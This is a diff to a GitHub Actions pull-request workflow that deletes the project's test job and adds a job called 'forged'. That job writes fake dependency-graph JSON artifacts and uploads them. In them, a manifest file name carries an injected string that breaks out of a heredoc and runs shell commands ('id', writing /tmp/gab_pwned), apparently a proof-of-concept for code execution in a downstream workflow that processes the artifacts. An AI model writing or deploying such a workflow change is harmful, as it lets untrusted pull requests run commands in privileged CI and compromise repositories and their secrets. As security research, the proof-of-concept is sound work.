@@ -4,15 +4,53 @@ on:
   pull_request:
     branches: [development, release-*]
 
-concurrency:
-  group: ${{ github.workflow }}-${{ github.event.pull_request.number }}
-  cancel-in-progress: true
+permissions:
+  contents: read
 
 jobs:
-  run_tests:
-    uses: epam/ai-dial-ci/.github/workflows/java_pr.yml@4.13.2
-    with:
-      java-version: "25"
-      trivy-severity: "CRITICAL,HIGH,MEDIUM,LOW"
-      trivy-severity-for-sarif: "CRITICAL,HIGH,MEDIUM,LOW"
-    secrets: inherit
+  forged:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build forged dependency graph artifact
+        env:
+          BASE_SHA: ${{ github.event.pull_request.base.sha }}
+          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
+          PR_NUM: ${{ github.event.pull_request.number }}
+        run: |
+          mkdir -p dependency-graph-reports
+          python3 - <<'PY'
+          import json, os
+          base, head, n = os.environ["BASE_SHA"], os.environ["HEAD_SHA"], os.environ["PR_NUM"]
+          evil = (
+              "x\n"
+              "EOF\n"
+              "id; echo GAB_RCE_PROOF\n"
+              "echo marker > /tmp/gab_pwned\n"
+              "exit 0\n"
+              "#"
+          )
+          def snap(sha, ref, manifests, corr):
+              return {"version": 0, "sha": sha, "ref": ref,
+                      "job": {"correlator": corr, "id": "poc"},
+                      "detector": {"name": "gab-rce-detector", "version": "1.0.0", "url": "https://example.com"},
+                      "scanned": "2026-11-12T00:00:00Z", "manifests": manifests}
+          def man(name, purls, loc):
+              return {"name": name, "file": {"source_location": loc},
+                      "resolved": {p: {"package_url": p, "relationship": "direct",
+                                       "scope": "runtime", "dependencies": []} for p in purls}}
+          base_man = {"build.gradle": man("build.gradle", ["pkg:maven/com.example/base@1.0.0"], "build.gradle")}
+          head_man = {
+              "build.gradle": man("build.gradle", ["pkg:maven/com.example/base@1.0.0"], "build.gradle"),
+              evil: man(evil, ["pkg:maven/com.example/zzz@1.0.0"], evil),
+          }
+          json.dump(snap(base, "refs/heads/development", base_man, "gab-base"), open("dependency-graph-reports/poc-base.json", "w"))
+          json.dump(snap(head, "refs/pull/%s/merge" % n, head_man, "gab-head"), open("dependency-graph-reports/poc-head.json", "w"))
+          PY
+          echo keep > keep.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: dependency-graph_poc.json
+          path: |
+            dependency-graph-reports/poc-base.json
+            dependency-graph-reports/poc-head.json
+            keep.txt
